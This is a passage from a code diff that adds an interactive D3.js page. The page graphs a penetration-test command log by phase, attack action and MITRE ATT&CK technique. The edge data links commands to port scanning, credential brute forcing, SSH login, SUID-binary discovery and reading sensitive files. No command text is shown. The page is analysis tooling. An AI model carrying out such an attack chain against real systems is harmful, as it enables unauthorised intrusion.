+      "layer": "actions"
+    },
+    {
+      "source": "effect::shellAccessGained",
+      "target": "action::findSUIDBinaries",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::readSensitiveFile",
+      "target": "effect::fileContentsRead",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::shellAccessGained",
+      "target": "action::readSensitiveFile",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "mitre::T1046",
+      "target": "mitre::T1083",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "mitre::T1083",
+      "target": "mitre::T1059",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "mitre::T1059",
+      "target": "mitre::T1110",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "mitre::T1110",
+      "target": "mitre::T1078",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "mitre::T1078",
+      "target": "mitre::T1033",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "cmd::0",
+      "target": "action::scanAllPorts",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::0",
+      "target": "mitre::T1046",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::1",
+      "target": "action::scanAllPorts",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::1",
+      "target": "mitre::T1046",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::2",
+      "target": "action::enumerateWebDirs",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::2",
+      "target": "mitre::T1083",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::3",
+      "target": "action::scanWebApp",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::3",
+      "target": "mitre::T1059",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::4",
+      "target": "action::bruteForceCredentials",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::4",
+      "target": "mitre::T1110",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::5",
+      "target": "action::loginSSH",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::5",
+      "target": "mitre::T1078",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::6",
+      "target": "action::gatherSystemInfo",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::6",
+      "target": "mitre::T1033",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::7",
+      "target": "action::gatherSystemInfo",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::7",
+      "target": "mitre::T1033",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::8",
+      "target": "action::executeCommand",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::8",
+      "target": "mitre::T1059",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::9",
+      "target": "action::findSUIDBinaries",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::9",
+      "target": "mitre::T1083",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::10",
+      "target": "action::executeCommand",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::10",
+      "target": "mitre::T1059",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::11",
+      "target": "action::readSensitiveFile",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::11",
+      "target": "mitre::T1083",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::12",
+      "target": "action::readSensitiveFile",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::12",
+      "target": "mitre::T1083",
+      "type": "maps_to",
+      "layer": "cross"
+    }
+  ],
+  "color_maps": {
+    "phase": {
+      "reconnaissance": "#4e9af1",
+      "exploitation": "#e84a4a",
+      "post-exploitation": "#f1c94e",
+      "lateral-movement": "#20b2aa",
+      "persistence": "#a0d468",
+      "exfiltration": "#ff4757",
+      "noise": "#555555"
+    },
+    "mitre_tactic": {
+      "reconnaissance": "#4e9af1",
+      "resource-development": "#7ec8e3",
+      "initial-access": "#c97fc9",
+      "execution": "#f1c94e",
+      "persistence": "#a0d468",
+      "privilege-escalation": "#e84a4a",
+      "defense-evasion": "#fd9644",
+      "credential-access": "#da77f2",
+      "discovery": "#e8884a",
+      "lateral-movement": "#20b2aa",
+      "collection": "#a0522d",
+      "command-and-control": "#ff6b6b",
+      "exfiltration": "#ff4757",
+      "impact": "#ff0000",
+      "none": "#888888"
+    },
+    "effect": {
+      "effect": "#6e48aa"
+    }
+  }
+};
+const COLOR_MAPS = GRAPH.color_maps;
+
+let activeLayer = 'command';
+let simulation = null;
+
+// ── SVG setup ──────────────────────────────────────────────────────────────
+const svg = d3.select('#svg');
+const container = svg.append('g').attr('class', 'container');
+
+svg.call(d3.zoom().scaleExtent([0.08, 4]).on('zoom', (e) => container.attr('transform', e.transform)));
+
+const defs = svg.append('defs');
+function addMarker(id, color) {
+  defs.append('marker')
+    .attr('id', id)
+    .attr('viewBox', '0 -4 8 8').attr('refX', 16).attr('refY', 0)
+    .attr('markerWidth', 5).attr('markerHeight', 5).attr('orient', 'auto')
+    .append('path').attr('d', 'M0,-4L8,0L0,4').attr('fill', color);
+}
+addMarker('arrow-gray',  '#30363d');
+addMarker('arrow-green', '#3fb950');
+addMarker('arrow-blue',  '#58a6ff');
+
+const linkGroup = container.append('g').attr('class', 'links');
+const nodeGroup = container.append('g').attr('class', 'nodes');
+
+document.getElementById('meta-text').textContent =
+  `${GRAPH.meta.total_entries} entries · ${GRAPH.meta.source_files.length} file(s)`;
+
+// ── Layer toggle ───────────────────────────────────────────────────────────
+document.querySelectorAll('.layer-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('.layer-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    closePanel();
+    activeLayer = btn.dataset.layer;
+    renderGraph();
+    renderLegend();
+  });
+});
+
+// ── Graph rendering ────────────────────────────────────────────────────────
+function getVisibleNodes() {
+  if (activeLayer === 'command') return GRAPH.nodes;
+  if (activeLayer === 'mitre')   return GRAPH.mitre_nodes;
+  if (activeLayer === 'actions') return GRAPH.actions_effects_nodes;
+  return [];
+}
+
+function getVisibleEdges(nodeIds) {
+  return GRAPH.edges.filter(e => e.layer === activeLayer && nodeIds.has(e.source) && nodeIds.has(e.target));
+}
+
+function getNodeColor(node) {
+  if (activeLayer === 'command') return node.color_command;
+  return node.color;
+}
+
+function getNodeRadius(node) {
+  if (activeLayer === 'command') return node.raw && node.raw.is_noise ? 5 : 9;
+  if (activeLayer === 'actions') {
+    if (node.node_type === 'effect') return 9;
+    const c = node.entry_ids ? node.entry_ids.length : 1;
+    return Math.max(10, Math.min(22, 10 + c * 2));
+  }
+  const c = node.entry_ids ? node.entry_ids.length : 1;
+  return Math.max(10, Math.min(28, 10 + c * 2));
+}
+
+// Circle and diamond path generators (centered at origin)
+function circlePath(r) { return `M ${r},0 A ${r},${r} 0 1,0 ${-r},0 A ${r},${r} 0 1,0 ${r},0 Z`; }
+function diamondPath(r) { return `M 0,${-r} L ${r},0 L 0,${r} L ${-r},0 Z`; }
+
+function getNodePath(node) {
+  const r = getNodeRadius(node);
+  if (activeLayer === 'actions' && node.node_type === 'effect') return diamondPath(r);
+  return circlePath(r);
+}
+
+function getNodeLabel(node) {
+  if (activeLayer === 'command') {
+    const cmd = node.raw && node.raw.cleaned_command ? node.raw.cleaned_command : node.command;
+    return cmd ? cmd.substring(0, 28) : '';
+  }
+  if (activeLayer === 'actions') {
+    // Split camelCase to words, truncate
+    return (node.label || '').replace(/([A-Z])/g, ' $1').trim().substring(0, 20);
+  }
+  return (node.label || '').substring(0, 20);
+}
+
+function edgeMarker(e) {
+  if (e.type === 'produces') return 'url(#arrow-green)';
+  if (e.type === 'enables')  return 'url(#arrow-blue)';
+  return 'url(#arrow-gray)';
+}
+
+function renderGraph() {
+  const rawNodes = getVisibleNodes();
+  const nodes = rawNodes.map(n => ({ ...n }));
+  const nodeById = Object.fromEntries(nodes.map(n => [n.id, n]));
+  const nodeIds = new Set(nodes.map(n => n.id));
+
+  const rawEdges = getVisibleEdges(nodeIds);
+  const edges = rawEdges.map(e => ({ ...e,
+    source: nodeById[e.source] || e.source,
+    target: nodeById[e.target] || e.target,
+  }));
+
+  document.getElementById('stats').textContent = `${nodes.length} nodes · ${edges.length} edges`;
+
+  if (simulation) simulation.stop();
+
+  const svgEl = document.getElementById('svg');
+  const W = svgEl.clientWidth || 900;
+  const H = svgEl.clientHeight || 600;
+
+  simulation = d3.forceSimulation(nodes)
+    .force('link', d3.forceLink(edges).id(n => n.id).distance(90).strength(0.4))
+    .force('charge', d3.forceManyBody().strength(-220))
+    .force('center', d3.forceCenter(W / 2, H / 2))
+    .force('collision', d3.forceCollide().radius(n => getNodeRadius(n) + 8));
+
+  // Links
+  const link = linkGroup.selectAll('.link').data(edges, e => `${e.source.id || e.source}→${e.target.id || e.target}`);
+  link.exit().remove();
+  const linkEnter = link.enter().append('line')
+    .attr('class', e => `link link-${e.type}`)
+    .attr('marker-end', e => edgeMarker(e));
+  const linkMerge = linkEnter.merge(link);
+
+  // Nodes
+  const node = nodeGroup.selectAll('.node').data(nodes, n => n.id);
+  node.exit().remove();
+
+  const nodeEnter = node.enter().append('g')
+    .attr('class', n => 'node' + (n.raw && n.raw.is_noise ? ' noise' : ''))
+    .call(d3.drag()
+      .on('start', (e, n) => { if (!e.active) simulation.alphaTarget(0.3).restart(); n.fx = n.x; n.fy = n.y; })
+      .on('drag',  (e, n) => { n.fx = e.x; n.fy = e.y; })
+      .on('end',   (e, n) => { if (!e.active) simulation.alphaTarget(0); n.fx = null; n.fy = null; })
+    )
+    .on('click', (e, n) => { e.stopPropagation(); selectNode(n); })
+    .on('mouseover', showTooltip)
+    .on('mouseout', hideTooltip);
+
+  nodeEnter.append('path')
+    .attr('class', 'node-shape')
+    .attr('d', n => getNodePath(n))
+    .attr('fill', n => getNodeColor(n))
+    .attr('stroke', '#0d1117');
+
+  nodeEnter.append('text')
+    .attr('dy', n => getNodeRadius(n) + 13)
+    .attr('text-anchor', 'middle')
+    .text(n => getNodeLabel(n));
+
+  const nodeMerge = nodeEnter.merge(node);
+  nodeMerge.select('.node-shape')
+    .attr('d', n => getNodePath(n))
+    .attr('fill', n => getNodeColor(n));
+  nodeMerge.select('text').text(n => getNodeLabel(n));
+
+  simulation.on('tick', () => {
+    linkMerge.attr('x1', e => e.source.x).attr('y1', e => e.source.y)
+             .attr('x2', e => e.target.x).attr('y2', e => e.target.y);
+    nodeMerge.attr('transform', n => `translate(${n.x},${n.y})`);
+  });
+
+  svg.on('click', () => { closePanel(); nodeGroup.selectAll('.node').classed('selected', false); });
+}
+
+// ── Detail panel ───────────────────────────────────────────────────────────
+function selectNode(node) {
+  nodeGroup.selectAll('.node').classed('selected', n => n.id === node.id);
+  showDetail(node);
+}
+
+function field(label, value, mono=false) {
+  if (!value && value !== 0) return '';
+  return `<div class="detail-field">
+    <label>${label}</label>
+    <div class="value${mono ? ' mono' : ''}">${esc(String(value))}</div>
+  </div>`;
+}
+
+function badge(text, color) {
+  return `<span class="badge" style="background:${color}22;color:${color};border:1px solid ${color}44">${esc(text)}</span>`;
+}
+
+function esc(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+function cmdList(entry_ids, onclick) {
+  return (entry_ids || []).map(eid => {
+    const cn = GRAPH.nodes.find(n => n.entry_id === eid);
+    if (!cn) return '';
+    const cmd = cn.raw && cn.raw.cleaned_command ? cn.raw.cleaned_command : cn.command;
+    return `<div class="badge" style="background:#21262d;color:#c9d1d9;border:1px solid #30363d;display:block;margin:3px 0;cursor:pointer;font-size:11px" onclick="${onclick}(${eid})">${esc(cmd.substring(0,50))}</div>`;
+  }).join('');
+}
+
+function showDetail(node) {
+  const panel = document.getElementById('detail-panel');
+  const body  = document.getElementById('detail-body');
+  panel.classList.add('visible');
+
+  if (activeLayer === 'command') {
+    const r = node.raw || {};
+    const m = node.mitre || {};
+    const ae = node.actions_effects || {};
+    body.innerHTML = `
+      ${field('Command', r.cleaned_command || node.command, true)}
+      ${field('Reasoning', node.reasoning)}
+      <div class="detail-field"><label>Phase</label><div>${badge(r.phase || 'unknown', node.color_command)}</div></div>
+      ${field('Tool', r.tool)}
+      ${field('Target', r.target)}
+      <div class="detail-field"><label>Action</label><div>${badge(ae.action_name || '?', node.color_action)}</div>
+        ${ae.action_description ? `<div style="margin-top:4px;font-size:12px;color:#8b949e">${esc(ae.action_description)}</div>` : ''}
+      </div>
+      ${ae.produces_effects && ae.produces_effects.length ? `<div class="detail-field"><label>Produces Effects</label><div>${ae.produces_effects.map(e => badge(e, '#3fb950')).join(' ')}</div></div>` : ''}
+      ${ae.requires_effects && ae.requires_effects.length ? `<div class="detail-field"><label>Requires Effects</label><div>${ae.requires_effects.map(e => badge(e, '#58a6ff')).join(' ')}</div></div>` : ''}
+      <div class="detail-field"><label>MITRE</label>
+        <div>${badge(m.technique_id || '?', node.color_mitre)} ${esc(m.technique_name || '')}</div>
+        <div style="margin-top:4px;font-size:11px;color:#8b949e">${m.tactic || ''}</div>
+      </div>
+      ${field('Source File', node.source_file)}
+      ${node.output ? field('Output', node.output.substring(0, 300), true) : ''}
+    `;
+  } else if (activeLayer === 'actions') {
+    if (node.node_type === 'action') {
+      body.innerHTML = `
+        <div class="detail-field"><label>Action</label><div style="font-size:15px;font-weight:600;color:#f0f6fc">${esc(node.name)}</div></div>
+        ${field('Description', node.description)}
+        <div class="detail-field"><label>Phase</label><div>${badge(node.phase, node.color)}</div></div>
+        ${node.produces_effects && node.produces_effects.length ? `<div class="detail-field"><label>Produces</label><div>${node.produces_effects.map(e => badge(e, '#3fb950')).join(' ')}</div></div>` : ''}
+        ${node.requires_effects && node.requires_effects.length ? `<div class="detail-field"><label>Requires</label><div>${node.requires_effects.map(e => badge(e, '#58a6ff')).join(' ')}</div></div>` : ''}
+        <div class="detail-field"><label>Commands (${(node.entry_ids||[]).length})</label>${cmdList(node.entry_ids, 'switchToCommand')}</div>
+      `;
+    } else {
+      body.innerHTML = `
+        <div class="detail-field"><label>Effect</label><div style="font-size:15px;font-weight:600;color:#f0f6fc">${esc(node.name)}</div></div>
+        ${node.produced_by && node.produced_by.length ? `<div class="detail-field"><label>Produced By</label><div>${node.produced_by.map(a => badge(a, '#3fb950')).join(' ')}</div></div>` : ''}
+        ${node.enables_actions && node.enables_actions.length ? `<div class="detail-field"><label>Enables</label><div>${node.enables_actions.map(a => badge(a, '#58a6ff')).join(' ')}</div></div>` : ''}
+      `;
+    }
+  } else if (activeLayer === 'mitre') {
+    body.innerHTML = `
+      ${field('Technique ID', node.label)}
+      ${field('Technique Name', node.technique_name)}
+      <div class="detail-field"><label>Tactic</label><div>${badge(node.tactic, node.color)}</div></div>
+      <div class="detail-field"><label>Commands (${(node.entry_ids||[]).length})</label>${cmdList(node.entry_ids, 'switchToCommand')}</div>
+    `;
+  }
+}
+
+function switchToCommand(eid) {
+  document.querySelectorAll('.layer-btn').forEach(b => b.classList.toggle('active', b.dataset.layer === 'command'));
+  closePanel();
+  activeLayer = 'command';
+  renderGraph();
+  renderLegend();
+  setTimeout(() => {
+    const target = GRAPH.nodes.find(n => n.entry_id === eid);
+    if (target) {
+      const g = nodeGroup.selectAll('.node').filter(n => n.entry_id === eid);
+      if (!g.empty()) selectNode(g.datum());
+    }
+  }, 600);
+}
+
+function closePanel() { document.getElementById('detail-panel').classList.remove('visible'); }
+document.getElementById('close-panel').addEventListener('click', closePanel);
+
+// ── Tooltip ────────────────────────────────────────────────────────────────
+const tooltip = document.getElementById('tooltip');
+function showTooltip(event, node) {
+  let text = '';
+  if (activeLayer === 'command') {
+    const cmd = node.raw && node.raw.cleaned_command ? node.raw.cleaned_command : node.command;
+    text = cmd || node.label;
+  } else if (activeLayer === 'actions') {
+    text = node.node_type === 'effect' ? `Effect: ${node.name}` : `Action: ${node.name} (${node.phase})`;
+  } else {
+    text = `${node.label}: ${node.technique_name || ''} (${node.tactic || ''})`;
+  }
+  tooltip.textContent = text;
+  tooltip.style.display = 'block';
+  tooltip.style.left = (event.offsetX + 14) + 'px';
+  tooltip.style.top  = (event.offsetY - 10) + 'px';
+}
+function hideTooltip() { tooltip.style.display = 'none'; }
+
+// ── Legend ─────────────────────────────────────────────────────────────────
+function renderLegend() {
+  const items = document.getElementById('legend-items');
+
+  if (activeLayer === 'command' || activeLayer === 'actions') {
+    const phaseMap = COLOR_MAPS.phase;
+    const effectColor = COLOR_MAPS.effect.effect;
+    let html = `<div class="legend-section"><h4>${activeLayer === 'actions' ? 'Actions (by phase)' : 'Phase'}</h4>`;
+    html += Object.entries(phaseMap).map(([k, c]) =>
+      `<div class="legend-item"><div class="legend-dot" style="background:${c}"></div><span>${k}</span></div>`
+    ).join('');
+    if (activeLayer === 'actions') {
+      html += `</div><div class="legend-section"><h4>Effects</h4>`;
+      html += `<div class="legend-item"><div class="legend-diamond" style="background:${effectColor}"></div><span>effect (diamond)</span></div>`;
+      html += `</div><div class="legend-section"><h4>Edges</h4>`;
+      html += `<div class="legend-item"><svg width="28" height="12"><line x1="0" y1="6" x2="28" y2="6" stroke="#3fb950" stroke-dasharray="4,2" stroke-width="1.5"/></svg><span>produces</span></div>`;
+      html += `<div class="legend-item"><svg width="28" height="12"><line x1="0" y1="6" x2="28" y2="6" stroke="#58a6ff" stroke-width="1.5"/></svg><span>enables</span></div>`;
+    }
+    html += `</div>`;
+    items.innerHTML = html;
+  } else {
+    const map = COLOR_MAPS.mitre_tactic;
+    items.innerHTML = `<div class="legend-section"><h4>Tactic</h4>` +
+      Object.entries(map).map(([k, c]) =>
+        `<div class="legend-item"><div class="legend-dot" style="background:${c}"></div><span>${k}</span></div>`
+      ).join('') + `</div>`;
+  }
+}
+
+// ── Init ───────────────────────────────────────────────────────────────────
+renderGraph();
+renderLegend();
+</script>
+</body>
+</html>
